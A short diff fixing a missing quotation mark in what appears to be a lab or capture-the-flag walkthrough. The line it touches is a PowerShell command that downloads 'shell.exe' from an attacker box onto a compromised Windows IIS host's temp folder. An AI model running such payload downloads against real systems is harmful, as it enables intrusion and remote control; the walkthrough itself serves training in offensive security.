@@ -363,7 +363,7 @@ Then upload the exploit to the target and check it arrived:
 c:\windows\system32\inetsrv>
 cd c:\windows\temp
 c:\Windows\Temp>
-powershell -c "Invoke-WebRequest -Uri 'http://<AttackBoxIP>:8000/shell.exe' -Outfile 'c:\windows\temp\shell.exe'
+powershell -c "Invoke-WebRequest -Uri 'http://<AttackBoxIP>:8000/shell.exe' -Outfile 'c:\windows\temp\shell.exe'"
 dir shell.*
 c:\Windows\Temp>dir shell.*
  Volume in drive C has no label.
